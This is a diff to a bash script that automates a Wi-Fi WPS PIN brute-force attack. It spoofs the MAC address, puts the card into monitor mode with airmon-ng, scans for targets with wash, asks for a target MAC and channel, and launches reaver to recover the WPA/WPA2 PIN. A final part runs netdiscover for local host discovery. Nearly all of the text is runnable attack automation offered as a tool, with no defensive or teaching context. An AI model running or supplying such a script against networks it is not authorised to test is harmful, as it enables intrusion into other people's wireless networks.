@@ -89,22 +89,25 @@ trap control_c SIGINT
        echo -e "\e[00;31m[IMPORTANT!]\e[00m" 
  echo -e  "\e[00;33m Wait to capture information! 
 --------------------------------------------------------------------------- 
-        If you want you can opened manually in /root/result.txt directory
+If you want you can opened manually in /root/result.txt directory
 But after the program stop this file will be deleted for your safety.\e[00m"
-        xterm -e service network-manager stop
-        xterm -e ifconfig wlan1 down
-        xterm -e macchanger -a wlan0
-        xterm -e airmon-ng start wlan0
-        xterm -e timeout 120s wash -i mon0 --out-file ~/result.txt 
-        leafpad /root/result.txt &
+         xterm -e service network-manager stop
+         xterm -e ifconfig wlan0 down
+         xterm -e macchanger -a wlan0
+         xterm -e airmon-ng start wlan0
+         xterm -e timeout 120s wash -i mon0 --out-file ~/result.txt 
+         leafpad /root/result.txt &
 
-        echo -e "\e[00;35m[What is the MAC address for the target?]\e[00m "
-        read TARGET
-        echo -e "\e[00;35m[What is the CHANNEL for the target?]\e[00m "
-        read CHANNEL
-        gnome-terminal -x reaver -i mon0 -b $TARGET -vv -c $CHANNEL &
-        echo -e "\e[00;31m[When the program is finished save hacked pin WPA/2 and Press Ctrl+C to EXIT & ClEAN!]\e[00m"
-        read
+         echo -e "\e[00;35m[What is the MAC address for the target?]\e[00m "
+         read TARGET
+         echo -e "\e[00;35m[What is the CHANNEL for the target?]\e[00m "
+         read CHANNEL
+         gnome-terminal -e "bash -c 'reaver -i mon0 -b $TARGET -vv -c $CHANNEL; exec $SHELL'" &
+         echo -e "\e[00;31m[IMPORTANT!!!]\e[00m"
+         echo -e "\e[00;31m[When the program is finished save hacked pin WPA/2 and Press Ctrl+C to EXIT & ClEAN!]\e[00m"
+         sleep 48h 
+         read 
+        
    fi
 
 #PART 2
@@ -113,7 +116,7 @@ But after the program stop this file will be deleted for your safety.\e[00m"
        echo -e "\e[00;31m[IMPORTANT!]\e[00m" 
        echo -e  "\e[00;33m Wait to capture information! 
 --------------------------------------------------------------------------- 
-        If you want you can opened manually in /root/result.txt directory
+If you want you can opened manually in /root/result.txt directory
 But after the program stop this file will be deleted for your safety.\e[00m"
          xterm -e service network-manager stop
          xterm -e ifconfig wlan1 down
@@ -126,9 +129,12 @@ But after the program stop this file will be deleted for your safety.\e[00m"
          read TARGET
          echo -e "\e[00;35m[What is the CHANNEL for the target?]\e[00m "
          read CHANNEL
-         gnome-terminal -x reaver -i mon0 -b $TARGET -vv -c $CHANNEL &
-         echo -e "\e[00;31m[When the program is finished save hacked pin WPA/2 and Press Ctrl+C to EXIT & ClEAN!]\e[00m" 
-         read
+         gnome-terminal -e "bash -c 'reaver -i mon0 -b $TARGET -vv -c $CHANNEL; exec $SHELL'" &
+         echo -e "\e[00;31m[IMPORTANT!!!]\e[00m"
+         echo -e "\e[00;31m[When the program is finished save hacked pin WPA/2 and Press Ctrl+C to EXIT & ClEAN!]\e[00m"
+         sleep 48h 
+         read 
+         
   fi
 
 #PART 3
@@ -146,8 +152,10 @@ But after the program stop this file will be deleted for your safety.\e[00m"
                echo -e "\e[00;34m[Wait to Scan wlan1 or press Ctrl+C to EXIT]\e[00m"
         $wlan1 xterm -geometry 100x30 -e timeout 120s netdiscover -i wlan1
    
-        echo -e "\e[00;31m[IMPORTANT]\e[00m"
+               echo -e "\e[00;31m[IMPORTANT!!!]\e[00m"
                echo -e "\e[00;31m[When the program is finished Press Ctrl+C to EXIT & ClEAN!]\e[00m"
-               read 
+               sleep 5 
+               read
+               
   fi 
                      exit;
